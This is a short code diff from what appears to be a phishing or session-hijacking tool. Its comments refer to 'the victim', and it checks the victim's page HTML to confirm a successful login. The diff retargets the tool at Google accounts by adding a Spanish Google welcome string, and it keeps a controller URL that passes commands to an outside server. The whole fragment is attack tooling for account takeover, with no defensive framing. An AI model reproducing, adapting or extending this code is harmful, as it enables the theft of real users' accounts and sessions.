@@ -5,8 +5,7 @@ const serverName = "SNAME";	// substituded by index.php and reset by controller
 // define at least one search string
 //	if found in the HTML source of a page of the victim, it is assumed there is a successful login
 const searchStrings = [
-	'<li class="menu-item-account">',
-	'<em>Account</em>Overview'
+	'Te damos la bienvenida,', // accounts.google.com
 ];
 //const targetCookie = "";
 const ctrlUrl = "https://controller/?svr=" + serverName + "&reqid=" + id + "&cmd=";
